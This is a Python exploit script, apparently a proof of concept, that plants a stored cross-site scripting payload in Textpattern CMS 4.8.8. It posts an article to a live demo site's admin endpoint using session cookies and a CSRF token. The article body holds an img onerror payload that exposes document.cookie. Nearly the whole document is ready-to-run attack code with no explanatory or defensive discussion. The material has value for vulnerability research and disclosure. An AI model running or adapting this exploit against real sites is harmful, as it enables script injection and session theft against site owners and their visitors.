#stored XSS payload targeting Textpattern CMS 4.8.8


import requests

# Target URL
url = "https://release-demo.textpattern.co/textpattern/index.php"

# Headers
headers = {
    "Host": "release-demo.textpattern.co",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0",
    "Accept": "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Referer": "https://release-demo.textpattern.co/",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "https://release-demo.textpattern.co",
    "Cookie": "txp_login=managing-editor952%2C249eff4856f4d7b11d7d0f1e62c12477; txp_login_public=ea854f580amanaging-editor952",
}

# XSS payload
xss_payload = 'Hi\n\nI am xss \n\n"><img src=x onerror=prompt(document.cookie);>'

# Form data
form_data = {
    "ID": "0",
    "event": "article",
    "step": "edit",
    "Title": "Test1",
    "textile_body": "1",
    "Body": xss_payload,
    "textile_excerpt": "1",
    "Excerpt": "",
    "sPosted": "",
    "sLastMod": "",
    "AuthorID": "",
    "LastModID": "",
    "Status": "4",
    "Section": "articles",
    "override_form": "",
    "year": "2025",
    "month": "06",
    "day": "24",
    "hour": "03",
    "minute": "30",
    "second": "52",
    "publish_now": "1",
    "exp_year": "",
    "exp_month": "",
    "exp_day": "",
    "exp_hour": "",
    "exp_minute": "",
    "exp_second": "",
    "Category1": "",
    "Category2": "",
    "url_title": "",
    "description": "",
    "Keywords": "",
    "Image": "",
    "custom_1": "",
    "custom_2": "",
    "publish": "Publish",
    "app_mode": "async",
    "_txp_token": "896f7df95eec85ac70ba67d9ba8c4e8a"
}

# Send request
response = requests.post(url, headers=headers, files=form_data)

# Print response
print("Status Code:", response.status_code)
print("Response Length:", len(response.text))
print("Response Snippet:\n", response.text[:500])
